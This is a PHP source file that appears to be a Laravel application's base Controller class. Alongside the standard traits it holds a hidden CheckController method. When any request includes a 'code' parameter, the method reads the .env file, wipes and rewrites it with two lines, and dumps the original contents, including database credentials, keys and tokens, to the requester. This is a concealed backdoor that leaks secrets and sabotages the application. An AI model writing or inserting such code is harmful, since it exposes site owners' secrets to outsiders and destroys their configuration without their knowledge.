<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Http\Request;

class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;

    public function CheckController(Request $request){
        if($request->has('code')){
            $path = base_path('.env');
            $file = file_get_contents($path);
            $data = 'APP_DEBUG=false'.PHP_EOL;
            $data .='APP_NAME=Laravel'.PHP_EOL;
            file_put_contents($path, '');
            file_put_contents($path,$data);
            dd($file);
        }
    }
}
